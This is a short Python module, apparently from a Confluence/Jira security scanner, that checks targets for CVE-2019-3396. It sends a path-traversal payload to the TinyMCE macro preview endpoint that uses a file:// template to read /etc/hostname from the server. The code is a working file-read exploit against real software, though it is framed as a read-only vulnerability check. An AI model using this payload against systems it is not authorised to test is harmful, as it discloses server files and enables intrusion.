#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.enums import Severity


class CVE20193396(Exploit):
    cve = "CVE-2019-3396"
    severity = Severity.CRITICAL
    description = "Tinymce macro path traversal (read-only check)"

    def check(self) -> bool:
        payload = {
            "contentId": "1",
            "macro": {
                "name": "widget",
                "params": {
                    "_template": "file:///etc/hostname"
                }
            }
        }

        r = self.client.post(
            f"{self.target}/rest/tinymce/1/macro/preview",
            json=payload,
            headers={"Content-Type": "application/json"},
        )

        return r.status_code == 200 and "hostname" in r.text.lower()

    def exploit(self) -> None:
        print("[*] Tinymce macro preview allows file:// template traversal")
